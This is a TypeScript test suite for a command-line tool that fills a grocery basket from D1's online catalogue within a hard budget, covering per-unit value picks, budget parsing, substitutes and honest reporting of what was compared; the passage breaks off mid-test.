import { describe, expect, test } from "bun:test";
import {
  type BasketLine,
  type LineStatus,
  buildBasket,
  chooseBest,
  compareBaskets,
  fillToBudget,
  isFilled,
  linePrice,
  normalizeBrand,
  packPrices,
  pairRows,
  parseBudget,
  rowLabels,
} from "../src/basket.ts";
import { basketExit, basketOptions, basketTerms, comparisonExit, main } from "../src/cli.ts";
import { D1Client } from "../src/client.ts";
import type { Measure } from "../src/measure.ts";
import { renderBasket, renderComparison } from "../src/present.ts";
import { D1Error, type Product, UsageError } from "../src/types.ts";

function product(
  skuId: string,
  name: string,
  price: number,
  opts: { available?: boolean; measure?: Measure; amount?: number; brand?: string } = {},
): Product {
  const { available = true, measure, amount } = opts;
  const size = measure && amount ? { measure, amount } : undefined;
  return {
    productId: skuId,
    skuId,
    name,
    brand: opts.brand ?? "",
    linkText: "",
    categories: [],
    offers: [
      {
        sellerId: "1",
        sellerName: "Tiendas D1",
        price,
        listPrice: price,
        available,
        availableQuantity: available ? 10 : 0,
      },
    ],
    size,
    unitPrice: size && price > 0 ? Math.round(price / size.amount) : undefined,
    warnings: [],
  };
}

/**
 * A basket line, defaulting to a filled one.
 *
 * The default product is load-bearing: `fillToBudget` refuses to bill a filled
 * line that names no product, so a fixture omitting it is silently downgraded
 * and stops testing what it says it tests. Pass `product: undefined` explicitly
 * to exercise that guard.
 */
const line = (over: Partial<BasketLine> & { term: string }): BasketLine => ({
  status: "filled",
  compared: 1,
  matched: 1,
  product: product("stub", "PRODUCTO", over.price ?? 100_000),
  ...over,
});

describe("chooseBest", () => {
  test("picks best VALUE, not the cheapest pack", () => {
    // The rice case the whole per-unit feature exists for: the 500 g bag is the
    // cheapest pack and the worst buy.
    const pick = chooseBest([
      product("small", "ARROZ ESTÁNDAR 500 GRS", 155_000, { measure: "kg", amount: 0.5 }),
      product("big", "ARROZ ECONÓMICO 2000 GRS", 555_000, { measure: "kg", amount: 2 }),
    ]);
    expect(pick?.product.skuId).toBe("big");
  });

  test("ignores what D1 cannot supply here", () => {
    const pick = chooseBest([
      product("gone", "ARROZ BARATÍSIMO", 100_000, {
        available: false,
        measure: "kg",
        amount: 1,
      }),
      product("here", "ARROZ NORMAL", 300_000, { measure: "kg", amount: 1 }),
    ]);
    expect(pick?.product.skuId).toBe("here");
  });

  test("a price of 0 is 'no offer here', never the best buy", () => {
    // Deliberately sizeless, so the pack-price fallback is the path under test.
    // With a size, `unitPrice` is already undefined for an unpriced product and
    // the assertion would pass without the availability-and-price filter ever
    // running — it did, until a mutation showed the guard could be deleted with
    // the suite green. Sizeless, a $0 product sorts FIRST by pack price, which
    // is exactly the "$ 0 is not free" failure.
    const pick = chooseBest([
      product("noprice", "SIN OFERTA", 0),
      product("real", "CON PRECIO", 400_000),
    ]);
    expect(pick?.product.skuId).toBe("real");
  });

  test("does not blend measures — a $/unit bottle cannot beat a $/L oil", () => {
    // Observed live: an $8,990 empty bottle ranked among per-litre oil prices.
    //
    // The bottle is priced so its $/unit is the LOWEST number in the set. That
    // is the point: blending measures would rank it first on a number that
    // means nothing next to the others. An earlier fixture had the bottle
    // dearest, so removing the measure filter changed no result and the
    // assertion proved nothing.
    const pick = chooseBest([
      product("bottle", "BOTELLA PARA ACEITE", 100_000, { measure: "unit", amount: 1 }),
      product("oil3", "ACEITE 3000 ML", 2_050_000, { measure: "L", amount: 3 }),
      product("oil900", "ACEITE 900 ML", 695_000, { measure: "L", amount: 0.9 }),
    ]);
    // Two products are measured in L against one in units, so L is dominant and
    // the bottle is not a candidate at all — despite the smallest per-unit.
    expect(pick?.product.skuId).toBe("oil3");
  });

  test("falls back to pack price only when NOTHING publishes a size", () => {
    const pick = chooseBest([
      product("a", "COSA CARA", 900_000),
      product("b", "COSA BARATA", 300_000),
    ]);
    expect(pick?.product.skuId).toBe("b");
  });

  test("prefers a comparable answer over an incomparable cheaper one", () => {
    // The sizeless product is cheaper per pack, but cannot be compared on value.
    // Ranking it first would be the mixed-measure failure by another route.
    const pick = chooseBest([
      product("nosize", "GENÉRICO", 100_000),
      product("sized", "ARROZ 1 KG", 300_000, { measure: "kg", amount: 1 }),
    ]);
    expect(pick?.product.skuId).toBe("sized");
  });

  test("nothing eligible yields undefined rather than a phantom line", () => {
    expect(chooseBest([])).toBeUndefined();
    expect(chooseBest([product("x", "AGOTADO", 100_000, { available: false })])).toBeUndefined();
  });
});

describe("fillToBudget", () => {
  test("the ceiling is hard — a line that would exceed it is left out", () => {
    const plan = fillToBudget(
      [line({ term: "aceite", price: 2_050_000 }), line({ term: "huevos", price: 165_000 })],
      2_100_000,
    );
    expect(plan.total).toBe(2_050_000);
    expect(plan.remaining).toBe(50_000);
    expect(plan.lines.map((l) => l.status)).toEqual(["filled", "over-budget"]);
    // The whole point: never over the stated budget.
    expect(plan.total).toBeLessThanOrEqual(plan.budget);
  });

  test("one item too expensive does not strand everything after it", () => {
    // A fill that stopped at the first miss would drop the two cheap lines that
    // fit perfectly well, and report a smaller basket than the budget buys.
    const plan = fillToBudget(
      [
        line({ term: "caviar", price: 9_000_000 }),
        line({ term: "arroz", price: 555_000 }),
        line({ term: "leche", price: 309_000 }),
      ],
      1_000_000,
    );
    expect(plan.lines.map((l) => l.status)).toEqual(["over-budget", "filled", "filled"]);
    expect(plan.total).toBe(864_000);
  });

  test("fills in the order the shopper wrote, not cheapest-first", () => {
    // Reordering by value would spend the budget on whatever is cheapest per kg,
    // which is a different request than the one the list expresses.
    //
    // The two lines must have DIFFERENT prices and the assertion must name the
    // term. With both at 700_000 a value-sorted fill was indistinguishable from
    // an in-order one, so this test survived the very mutation it is named for.
    const plan = fillToBudget(
      [line({ term: "expensive", price: 800_000 }), line({ term: "cheap", price: 300_000 })],
      1_000_000,
    );
    expect(plan.lines.map((l) => l.term)).toEqual(["expensive", "cheap"]);
    expect(plan.lines[0]?.status).toBe("filled");
    expect(plan.lines[1]?.status).toBe("over-budget");
  });

  test("a line costing exactly what is left still fits", () => {
    // The boundary the whole feature is about. `>` -> `>=` passed the entire
    // suite before this existed, and would have refused a basket that spends
    // the budget exactly.
    const plan = fillToBudget([line({ term: "arroz", price: 100_000 })], 100_000);
    expect(plan.lines[0]?.status).toBe("filled");
    expect(plan.total).toBe(100_000);
    expect(plan.remaining).toBe(0);
  });

  test("a term nothing was found for stays unfilled and costs nothing", () => {
    const plan = fillToBudget(
      [line({ term: "unicornio", status: "no-match" }), line({ term: "arroz", price: 555_000 })],
      1_000_000,
    );
    expect(plan.lines[0]?.status).toBe("no-match");
    expect(plan.total).toBe(555_000);
  });

  test("a substitute line counts toward the total like any other", () => {
    const plan = fillToBudget(
      [line({ term: "pan", price: 195_000, status: "filled-by-substitute" })],
      1_000_000,
    );
    expect(plan.total).toBe(195_000);
  });

  test("an empty list spends nothing", () => {
    const plan = fillToBudget([], 1_000_000);
    expect(plan.total).toBe(0);
    expect(plan.remaining).toBe(1_000_000);
  });
});

describe("parseBudget", () => {
  test("reads pesos and returns hundredths, matching every other price", () => {
    expect(parseBudget("50000")).toBe(5_000_000);
    // Colombian thousands separators are how a person actually types it.
    expect(parseBudget("50.000")).toBe(5_000_000);
    expect(parseBudget("$ 50.000")).toBe(5_000_000);
  });

  test("refuses a budget that cannot buy anything", () => {
    // Rejected rather than defaulted: a basket built to a budget nobody set is
    // a claim about a shop the caller never asked for.
    expect(() => parseBudget("abc")).toThrow();
    expect(() => parseBudget("0")).toThrow();
    expect(() => parseBudget("-500")).toThrow();
    expect(() => parseBudget(undefined)).toThrow();
    expect(() => parseBudget(true)).toThrow();
  });
});

describe("basketExit", () => {
  test("3 when nothing fit, because a retry never changes that", () => {
    // Exit 1 across this CLI means "D1 refused or was unreachable; retry may
    // help". A budget that buys none of the list never becomes affordable on a
    // retry, so an agent with a retry-on-1 policy would loop forever.
    expect(basketExit([line({ term: "a", status: "no-match" })])).toBe(3);
  });

  test("0 for a partially filled basket, which is a real answer", () => {
    expect(basketExit([line({ term: "a" }), line({ term: "b", status: "over-budget" })])).toBe(0);
    expect(basketExit([line({ term: "a", status: "filled-by-substitute" })])).toBe(0);
  });
});

describe("basketOptions", () => {
  test("forwards the region, without which the whole basket is national", () => {
    // Dropping this silently prices every line against a catalogue nobody can
    // buy from. No network-free test of the command body can observe it.
    const o = basketOptions({ count: "20" }, { id: "v2.ABC" }, "1");
    expect(o.regionId).toBe("v2.ABC");
    expect(o.salesChannel).toBe("1");
    expect(o.count).toBe(20);
  });

  test("rejects a count that would silently clamp to one", () => {
    expect(() => basketOptions({ count: "0" }, undefined, "1")).toThrow();
  });
});

describe("renderBasket", () => {
  const plan = fillToBudget(
    [
      line({
        term: "arroz",
        price: 555_000,
        product: product("1075", "ARROZ ECONÓMICO 2000 GRS", 555_000, {
          measure: "kg",
          amount: 2,
        }),
        compared: 20,
        matched: 143,
      }),
      line({ term: "huevos", price: 900_000, compared: 5, matched: 5 }),
    ],
    600_000,
  );

  test("names what it could not fit, and why", () => {
    const out = renderBasket(plan, { regionId: "v2.ABC" });
    expect(out).toContain("Not included:");
    expect(out).toContain("huevos");
    expect(out).toContain("does not fit");
  });

  test("states that the budget was a ceiling", () => {
    // A reader who assumed best-effort would read a short basket as
    // "that is all D1 sells".
    expect(renderBasket(plan)).toContain("hard ceiling");
  });

  test("names the denominator it chose over", () => {
    // "best of 20 compared" alone reads as a survey of the shelf. Saying 143
    // matched is what makes the partiality visible.
    expect(renderBasket(plan)).toContain("of 143 D1 matched");
  });

  test("does not invent a denominator when it saw everything", () => {
    const all = fillToBudget(
      [
        line({
          term: "arroz",
          price: 555_000,
          product: product("1075", "ARROZ", 555_000, { measure: "kg", amount: 2 }),
          compared: 5,
          matched: 5,
        }),
      ],
      1_000_000,
    );
    expect(renderBasket(all)).toContain("best of 5 compared");
    expect(renderBasket(all)).not.toContain("D1 matched");
  });

  test("warns when no delivery point was resolved", () => {
    // Without a region these are national prices for a store nobody shops at.
    expect(renderBasket(plan)).toContain("NATIONAL");
    expect(renderBasket(plan, { regionId: "v2.ABC" })).not.toContain("NATIONAL");
  });

  test("says plainly when nothing fit at all", () => {
    const none = fillToBudget([line({ term: "arroz", price: 555_000 })], 10_000);
    expect(renderBasket(none)).toContain("Nothing could go in the basket — the budget was short.");
  });

  test("names a substitute rather than swapping it in quietly", () => {
    const sub = fillToBudget(
      [
        line({
          term: "pan",
          price: 195_000,
          status: "filled-by-substitute",
          product: product("738", "TOSTADA INTEGRAL", 195_000, { measure: "kg", amount: 0.15 }),
          replaces: product("192", "PAN ARTESANAL INTEGRAL", 0, { available: false }),
        }),
      ],
      1_000_000,
    );
    const out = renderBasket(sub, { regionId: "v2.ABC" });
    expect(out).toContain("replaces");
    expect(out).toContain("PAN ARTESANAL INTEGRAL");
  });
});

describe("linePrice", () => {
  test("is undefined for a product with no real offer", () => {
    expect(linePrice(product("x", "SIN PRECIO", 0))).toBeUndefined();
  });

  test("is the price a basket line actually costs", () => {
    expect(linePrice(product("x", "ARROZ", 555_000))).toBe(555_000);
  });
});

describe("parseBudget rejects what Number() would have accepted", () => {
  test("a decimal comma is refused, not silently multiplied by ten", () => {
    // Colombians write "50,5" meaning 50.5. Stripping the comma made it 505 —
    // a 10x budget that looks entirely plausible in the output.
    expect(() => parseBudget("50,5")).toThrow(/decimal comma/);
  });

  test("hex and scientific notation are not budgets", () => {
    // `Number("0x10")` is 16 and `Number("1e5")` is 100000. Both parsed, and
    // both meant something other than what was typed.
    expect(() => parseBudget("0x10")).toThrow();
    expect(() => parseBudget("1e5")).toThrow();
  });

  test("still accepts the forms a person actually types", () => {
    expect(parseBudget("50000")).toBe(5_000_000);
    expect(parseBudget("50.000")).toBe(5_000_000);
    expect(parseBudget("$ 50.000")).toBe(5_000_000);
    expect(parseBudget("$50000")).toBe(5_000_000);
  });

  test("a malformed thousands grouping is not a number", () => {
    expect(() => parseBudget("50.00")).toThrow();
    expect(() => parseBudget("5.0000")).toThrow();
  });
});

describe("a filled line always has a price", () => {
  test("a priceless line never enters the basket at $ 0", () => {
    // The reverse of the "$ 0 is not free" defect: a line marked filled with no
    // price would render as $ 0 and add nothing to the total, describing a
    // purchase that cannot happen.
    const plan = fillToBudget(
      [line({ term: "arroz", status: "filled", price: undefined })],
      1_000_000,
    );
    expect(plan.lines[0]?.status).toBe("nothing-in-stock");
    expect(plan.total).toBe(0);
    // `$ 0` in the SUMMARY is honest — the total really is zero. The defect
    // would be a priced product row, so assert on the basket body only.
    const out = renderBasket(plan, { regionId: "v2.ABC" });
    const body = out.slice(0, out.indexOf("0 of 1 lines"));
    expect(body).not.toContain("$ 0");
    // Not "Nothing fits this budget" — nothing was rejected on PRICE here.
    expect(body).toContain("could go in the basket");
  });
});

// ---------------------------------------------------------------------------
// Defects found by the cross-model review gate (P20)
// ---------------------------------------------------------------------------

describe("the dominant measure is decided deterministically", () => {
  const bottle = product("bottle", "BOTELLA PARA ACEITE", 899_000, {
    measure: "unit",
    amount: 1,
  });
  const oil = product("oil3", "ACEITE 3000 ML", 2_050_000, { measure: "L", amount: 3 });

  test("the same set gives the same answer in either order", () => {
    // The tie-break used to fall through to Map INSERTION order, which is the
    // order `search` happened to return — and that order is computed over
    // out-of-stock products too. So a page listing sold-out bottles first could
    // put an empty bottle in the basket as the best value for "aceite".
    expect(chooseBest([bottle, oil])?.product.skuId).toBe(chooseBest([oil, bottle])?.product.skuId);
  });

  test("a tie never resolves in favour of $/unit", () => {
    // A kilogram is a kilogram across products; one "unit" of an empty bottle
    // and one "unit" of oil are not the same kind of thing, so $/unit is the
    // least defensible answer available when the count is tied.
    expect(chooseBest([bottle, oil])?.product.skuId).toBe("oil3");
    expect(chooseBest([oil, bottle])?.product.skuId).toBe("oil3");
  });
});

describe("compared counts the set actually chosen between", () => {
  test("not the page, which includes what was never a candidate", () => {
    // A page of 20 where 18 are out of stock reports a choice between 2, not
    // 20. Reporting the page was the "3 of 140" overstatement by another route.
    const page = [
      product("a", "ACEITE A", 200_000, { measure: "L", amount: 1 }),
      product("b", "ACEITE B", 300_000, { measure: "L", amount: 1 }),
      ...Array.from({ length: 18 }, (_, i) =>
        product(`gone${i}`, `ACEITE AGOTADO ${i}`, 100_000, {
          available: false,
          measure: "L",
          amount: 1,
        }),
      ),
    ];
    expect(chooseBest(page)?.compared).toBe(2);
  });

  test("and excludes products outside the winning measure", () => {
    const pick = chooseBest([
      product("oil1", "ACEITE 1 L", 200_000, { measure: "L", amount: 1 }),
      product("oil2", "ACEITE 2 L", 300_000, { measure: "L", amount: 2 }),
      product("bottle", "BOTELLA", 100_000, { measure: "unit", amount: 1 }),
    ]);
    expect(pick?.compared).toBe(2);
  });
});

describe("a pack-price pick says so", () => {
  test("chooseBest flags it", () => {
    const pick = chooseBest([
      product("big", "ARROZ 5 KG SIN PUM", 2_000_000),
      product("tiny", "ARROZ 250 GR SIN PUM", 190_000),
    ]);
    expect(pick?.byPackPrice).toBe(true);
    expect(
      chooseBest([product("sized", "ARROZ 1 KG", 300_000, { measure: "kg", amount: 1 })])
        ?.byPackPrice,
    ).toBe(false);
  });

  test("and the output does not call it the best value", () => {
    // $ 1.900 for 250 g is $ 7.600/kg against the 5 kg bag's $ 4.000/kg. Calling
    // that "best value" is the cheapest-pack-is-the-worst-buy error the unit
    // pricing feature exists to prevent.
    const plan = fillToBudget(
      [
        line({
          term: "arroz",
          price: 190_000,
          product: product("tiny", "ARROZ 250 GR SIN PUM", 190_000),
          byPackPrice: true,
        }),
      ],
      1_000_000,
    );
    const out = renderBasket(plan, { regionId: "v2.ABC" });
    expect(out).toContain("chosen on pack price");
  });
});

describe("a failed replacement lookup is not a claim about stock", () => {
  test("it says unknown, never empty", () => {
    // A bare catch turned "D1 did not answer" into "nothing is in stock here",
    // asserted from zero successful requests — and exited 3, which is
    // documented as never worth retrying.
    const plan = fillToBudget(
      [line({ term: "pan", status: "replacement-unknown", compared: 1 })],
      1_000_000,
    );
    const out = renderBasket(plan, { regionId: "v2.ABC" });
    expect(out).toContain("did not answer");
    expect(out).toContain("unknown, not empty");
  });
});

describe("the ceiling holds against arithmetic accidents", () => {
  test("a non-finite price cannot breach it", () => {
    // `sum()` coerces NaN to 0 while `spent` becomes NaN, after which every
    // `spent + price > budget` is false and every remaining line is admitted.
    // `remaining` then went negative on a documented hard ceiling.
    const plan = fillToBudget(
      [
        line({ term: "broken", price: Number.NaN }),
        line({ term: "a", price: 900_000 }),
        line({ term: "b", price: 900_000 }),
      ],
      100_000,
    );
    expect(plan.total).toBeLessThanOrEqual(plan.budget);
    expect(plan.remaining).toBeGreaterThanOrEqual(0);
    expect(plan.lines[0]?.status).toBe("nothing-in-stock");
  });

  test("a priced line that is not being filled does not consume budget", () => {
    // `spent` counted any priced line while `total` counted only filled ones,
    // so the basket refused affordable items while reporting the money as left.
    const plan = fillToBudget(
      [
        line({ term: "ghost", status: "nothing-in-stock", price: 90_000 }),
        line({ term: "real", price: 90_000 }),
      ],
      100_000,
    );
    expect(plan.lines[1]?.status).toBe("filled");
    expect(plan.total).toBe(90_000);
  });
});

describe("a numeric budget obeys the same rules as a typed one", () => {
  test("fractional pesos are refused either way", () => {
    // `parseBudget("50,5")` was refused by name for being fractional while
    // `parseBudget(50.5)` returned half a peso, and `parseBudget(0.004)`
    // returned a budget of ZERO from a positive input.
    expect(() => parseBudget(50.5)).toThrow();
    expect(() => parseBudget(0.004)).toThrow();
    expect(parseBudget(50_000)).toBe(5_000_000);
  });
});

describe("a filled line with no product is not billed", () => {
  test("it neither renders nor counts", () => {
    // Dropping it from the body alone gave an empty basket whose summary still
    // read "1 of 1 lines · $ 5.550".
    const plan = fillToBudget(
      [line({ term: "arroz", price: 555_000, product: undefined })],
      1_000_000,
    );
    // The total is the assertion that matters. Excluding it from the RENDER
    // alone still left the summary reading "0 of 1 lines · $ 5.550" — a basket
    // that bills money for a product it cannot name.
    expect(plan.total).toBe(0);
    const out = renderBasket(plan, { regionId: "v2.ABC" });
    expect(out).toContain("0 of 1 lines");
    expect(out).toContain("could go in the basket");
    expect(out).not.toContain("$ 5.550");
  });
});

// ---------------------------------------------------------------------------
// buildBasket — driven end to end against a stubbed D1
//
// Round 2 of the review found that NOTHING in this suite called `buildBasket`.
// Every fix living in it — the substitute fallback, the honest `compared`
// counts, the pack-price flag, the unreachable/empty distinction — was
// revertible with the whole suite green. That is the hole these close.
// ---------------------------------------------------------------------------

interface WireOpts {
  available?: boolean;
  price?: number;
  unit?: string;
  value?: string;
  brand?: string;
}
const wire = (id: string, name: string, o: WireOpts = {}) => ({
  productId: id,
  productName: name,
  brand: o.brand ?? "D1",
  linkText: id,
  categories: ["/Despensa/Granos/"],
  properties: o.unit
    ? [
        { name: "Unidad De Medida", values: [o.unit] },
        { name: "Valor de Medida", values: [o.value] },
      ]
    : [],
  items: [
    {
      itemId: id,
      nameComplete: name,
      sellers: [
        {
          sellerId: "1",
          commertialOffer: {
            Price: o.price ?? 1000,
            ListPrice: o.price ?? 1000,
            AvailableQuantity: o.available === false ? 0 : 25,
          },
        },
      ],
    },
  ],
});

/** A D1Client stand-in that answers search and SKU-lookup from canned payloads. */
function fakeClient(routes: {
  search?: unknown;
  sku?: unknown;
  skuThrows?: boolean;
  searchTotal?: number;
  /** Category sweep payload — `substitute` searches by FACET PATH, not query. */
  sweep?: unknown;
  sweepTotal?: number;
}) {
  const impl = (async (url: string) => {
    const u = new URL(String(url));
    if (u.pathname.includes("catalog_system")) {
      if (routes.skuThrows) throw new Error("ECONNRESET");
      return new Response(JSON.stringify(routes.sku ?? []), { status: 200 });
    }
    if (u.pathname.includes("intelligent-search/product_search")) {
      // A facet path is appended to the endpoint; a term search has none. That
      // is the only way to tell the category sweep from the shopper's own
      // query, and without it the sweep just replays the out-of-stock term and
      // the whole substitute path stays untested.
      const isSweep =
        u.pathname.replace(/\/api\/io\/_v\/api\/intelligent-search\/product_search\/?/, "") !== "";
      const products = ((isSweep && routes.sweep ? routes.sweep : routes.search) ??
        []) as unknown[];
      const total = isSweep
        ? (routes.sweepTotal ?? products.length)
        : (routes.searchTotal ?? products.length);
      return new Response(JSON.stringify({ products, recordsFiltered: total }), { status: 200 });
    }
    return new Response("[]", { status: 200 });
  }) as unknown as typeof fetch;
  return new D1Client({ fetchImpl: impl });
}

/** The catalog_system shape for a source SKU, so `findSubstitutes` can resolve it. */
const sourceSku = (id: string, name: string) => [
  {
    productId: id,
    productName: name,
    categories: ["/Panadería/Integral/"],
    items: wire(id, name, { available: false, price: 4000 }).items,
  },
];

describe("buildBasket", () => {
  test("fills a term with the best value it can actually buy", async () => {
    const plan = await buildBasket(
      fakeClient({
        search: [
          wire("small", "ARROZ 500 GRS", { price: 1550, unit: "Gr", value: "500" }),
          wire("big", "ARROZ 2000 GRS", { price: 5550, unit: "Gr", value: "2000" }),
        ],
        searchTotal: 40,
      }),
      ["arroz"],
      10_000_000,
    );
    expect(plan.lines[0]?.status).toBe("filled");
    expect(plan.lines[0]?.product?.skuId).toBe("big");
    // Two eligible products, of 40 D1 reported — not "40 compared".
    expect(plan.lines[0]?.compared).toBe(2);
    expect(plan.lines[0]?.matched).toBe(40);
  });

  test("a term D1 answers nothing for is no-match, compared 0", async () => {
    const plan = await buildBasket(fakeClient({ search: [] }), ["unicornio"], 10_000_000);
    expect(plan.lines[0]?.status).toBe("no-match");
    expect(plan.lines[0]?.compared).toBe(0);
  });

  test("an out-of-stock term reaches the substitute lookup at all", async () => {
    // Asserts the REQUEST, not the outcome. The previous version accepted
    // either of the only two statuses its own fixture could produce, so it was
    // a tautology: deleting the entire substitute path left it passing.
    const seen: string[] = [];
    const impl = (async (url: string) => {
      const u = String(url);
      seen.push(u);
      if (u.includes("catalog_system")) {
        return new Response(JSON.stringify(sourceSku("192", "PAN ARTESANAL INTEGRAL")), {
          status: 200,
        });
      }
      return new Response(
        JSON.stringify({
          products: [wire("192", "PAN ARTESANAL INTEGRAL", { available: false, price: 4000 })],
          recordsFiltered: 1,
        }),
        { status: 200 },
      );
    }) as unknown as typeof fetch;

    const plan = await buildBasket(new D1Client({ fetchImpl: impl }), ["pan"], 10_000_000);
    // It asked D1 about the SOURCE SKU — that is the fallback firing.
    expect(seen.some((u) => u.includes("catalog_system") && u.includes("192"))).toBe(true);
    expect(plan.lines[0]?.status).toBe("nothing-in-stock");
    expect(plan.lines[0]?.substituteSweep).toBe(true);
  });

  test("the substitute source is the best MATCH, not the cheapest per unit", async () => {
    // The page used to be re-sorted by unit price before `products[0]` was
    // taken as the source, so a shopper asking for rice whose rice was sold out
    // got replacements swept from the category of whatever was cheapest per
    // kilo — and the line read "replaces SAL REFINADA".
    const asked: string[] = [];
    const impl = (async (url: string) => {
      const u = String(url);
      if (u.includes("catalog_system")) {
        asked.push(u);
        return new Response(JSON.stringify([]), { status: 200 });
      }
      return new Response(
        JSON.stringify({
          products: [
            wire("100", "ARROZ ESTÁNDAR 1000 GRS", {
              available: false,
              price: 5000,
              unit: "Gr",
              value: "1000",
            }),
            wire("200", "SAL REFINADA 3000 GRS", {
              available: false,
              price: 2000,
              unit: "Gr",
              value: "3000",
            }),
          ],
          recordsFiltered: 2,
        }),
        { status: 200 },
      );
    }) as unknown as typeof fetch;

    await buildBasket(new D1Client({ fetchImpl: impl }), ["arroz"], 10_000_000);
    // Relevance order puts the rice first; per-unit order would put the salt
    // first at $666/kg against the rice's $5.000/kg.
    expect(asked[0]).toContain("skuId%3A100");
    expect(asked[0]).not.toContain("skuId%3A200");
  });

  test("a replacement lookup that FAILS is unknown, not empty — and exits 1", async () => {
    // The blocker: a bare catch turned a transport failure into a positive
    // claim about the shelf, and exit 3 told an agent never to retry it.
    const plan = await buildBasket(
      fakeClient({
        search: [wire("192", "PAN ARTESANAL", { available: false, price: 4000 })],
        skuThrows: true,
      }),
      ["pan"],
      10_000_000,
    );
    expect(plan.lines[0]?.status).toBe("replacement-unknown");
    expect(basketExit(plan.lines)).toBe(1);
    const out = renderBasket(plan, { regionId: "v2.ABC" });
    expect(out).toContain("unknown, not empty");
    expect(out).not.toContain("had no replacement");
  });

  test("the region reaches the search, or every price is national", async () => {
    const calls: string[] = [];
    const impl = (async (url: string) => {
      calls.push(String(url));
      return new Response(JSON.stringify({ products: [], recordsFiltered: 0 }), { status: 200 });
    }) as unknown as typeof fetch;
    await buildBasket(new D1Client({ fetchImpl: impl }), ["arroz"], 10_000_000, {
      regionId: "v2.ABC",
    });
    expect(calls[0]).toContain("regionId=v2.ABC");
  });

  test("a sizeless winner is flagged, so the output can decline to call it best value", async () => {
    const plan = await buildBasket(
      fakeClient({
        search: [
          wire("a", "ARROZ GRANDE SIN PUM", { price: 20_000 }),
          wire("b", "ARROZ CHICO SIN PUM", { price: 1900 }),
        ],
      }),
      ["arroz"],
      10_000_000,
    );
    expect(plan.lines[0]?.byPackPrice).toBe(true);
    expect(renderBasket(plan, { regionId: "v2.ABC" })).toContain("chosen on pack price");
  });

  test("the budget still binds across several terms", async () => {
    const plan = await buildBasket(
      fakeClient({ search: [wire("x", "COSA", { price: 4000, unit: "Gr", value: "1000" })] }),
      ["a", "b", "c"],
      900_000,
    );
    expect(plan.total).toBeLessThanOrEqual(plan.budget);
    expect(plan.lines.filter((l) => l.status === "filled")).toHaveLength(2);
    expect(plan.lines[2]?.status).toBe("over-budget");
  });
});

describe("buildBasket — the substitute path, exercised end to end", () => {
  const outOfStockTerm = [wire("192", "PAN ARTESANAL INTEGRAL", { available: false, price: 4000 })];

  test("a real replacement fills the line, named and scoped honestly", async () => {
    const plan = await buildBasket(
      fakeClient({
        search: outOfStockTerm,
        searchTotal: 12,
        sku: sourceSku("192", "PAN ARTESANAL INTEGRAL"),
        // One buyable alternative among a pool padded with sold-out products.
        sweep: [
          wire("192", "PAN ARTESANAL INTEGRAL", { available: false, price: 4000 }),
          wire("738", "TOSTADA INTEGRAL", { price: 1950, unit: "Gr", value: "150" }),
          ...Array.from({ length: 20 }, (_, i) =>
            wire(`gone${i}`, `PAN AGOTADO ${i}`, { available: false, price: 3000 }),
          ),
        ],
        sweepTotal: 140,
      }),
      ["pan"],
      10_000_000,
    );
    const l = plan.lines[0];
    expect(l?.status).toBe("filled-by-substitute");
    expect(l?.product?.skuId).toBe("738");
    expect(l?.replaces?.skuId).toBe("192");
    // Buyable candidates, not the 22-product pool and not `rankedCount` — the
    // price filter rejects more than the availability filter does.
    expect(l?.compared).toBe(1);
    expect(l?.substituteSweep).toBe(true);

    const out = renderBasket(plan, { regionId: "v2.ABC" });
    // The count came from a CATEGORY sweep, so it must not be compared against
    // `matched`, which counts the term's own search.
    expect(out).toContain("in its category");
    expect(out).not.toContain("D1 matched");
    expect(out).toContain("replaces");
  });

  test("a rankable candidate with no price is not a replacement", async () => {
    // `rankSubstitutes` filters on availability only. VTEX reports Price 0
    // ("no offer in this region") alongside a positive AvailableQuantity, so an
    // unbuyable candidate can rank — and it reached the basket, where the line
    // was downgraded and rendered "its category had no replacement" while still
    // carrying the product it had just found.
    const plan = await buildBasket(
      fakeClient({
        search: outOfStockTerm,
        sku: sourceSku("192", "PAN ARTESANAL INTEGRAL"),
        sweep: [wire("738", "TOSTADA SIN OFERTA", { price: 0 })],
        sweepTotal: 140,
      }),
      ["pan"],
      10_000_000,
    );
    const l = plan.lines[0];
    expect(l?.status).toBe("nothing-in-stock");
    // Critically: it must not claim to have found something it cannot sell.
    expect(l?.status).not.toBe("filled-by-substitute");
    expect(l?.replaces).toBeUndefined();
    expect(plan.total).toBe(0);
  });

  test("a replacement is never described as the best value for the term", async () => {
    // It is not chosen by value and not chosen from the term's own results — it
    // is the closest match in a category. Saying "best value among the products
    // fetched for its term" is false twice, and "chosen on pack price" (an
    // earlier attempt at this) misnames the mechanism a third way: substitutes
    // are ranked by name similarity and price PROXIMITY, never by pack price.
    const plan = await buildBasket(
      fakeClient({
        search: outOfStockTerm,
        sku: sourceSku("192", "PAN ARTESANAL INTEGRAL"),
        sweep: [wire("738", "TOSTADA SIN PUM", { price: 1950 })],
      }),
      ["pan"],
      10_000_000,
    );
    expect(plan.lines[0]?.status).toBe("filled-by-substitute");
    expect(plan.lines[0]?.byPackPrice).toBeUndefined();
    const out = renderBasket(plan, { regionId: "v2.ABC" });
    expect(out).not.toContain("chosen on pack price");
    expect(out).toContain("closest match from its category");
  });

  test("an empty category is reported as swept, not as a term with no matches", () => {
    // Render-level. Its end-to-end sibling below asserts that production
    // actually COMPUTES the flag and the count this fixture hands it — round 4
    // replaced the end-to-end version with this one and thereby stopped
    // observing the production path entirely.
    const plan = fillToBudget(
      [
        line({
          term: "pan",
          status: "nothing-in-stock",
          product: undefined,
          compared: 39,
          inStock: 39,
          matched: 12,
          substituteSweep: true,
        }),
      ],
      1_000_000,
    );
    const out = renderBasket(plan, { regionId: "v2.ABC" });
    expect(out).toContain("39 in its category");
    expect(out).not.toContain("12");
  });

  test("and production computes that flag and count itself", async () => {
    // The regression this catches: `compared` was briefly `buyable.length`,
    // which is 0 BY CONSTRUCTION on the empty path — so "(4 compared)" became
    // "(0 compared)" for every empty sweep, indistinguishable from an empty
    // category, and the number could no longer vary with the shelf at all.
    const plan = await buildBasket(
      fakeClient({
        search: [wire("192", "PAN ARTESANAL INTEGRAL", { available: false, price: 4000 })],
        searchTotal: 12,
        sku: sourceSku("192", "PAN ARTESANAL INTEGRAL"),
        // In stock, but D1 publishes no offer for any of them here.
        sweep: [
          wire("500", "PAN A", { price: 0 }),
          wire("501", "PAN B", { price: 0 }),
          wire("502", "PAN C", { price: 0 }),
        ],
        sweepTotal: 140,
      }),
      ["pan"],
      10_000_000,
    );
    const l = plan.lines[0];
    expect(l?.status).toBe("nothing-in-stock");
    expect(l?.substituteSweep).toBe(true);
    // Must vary with the shelf, not collapse to zero.
    expect(l?.compared).toBe(3);
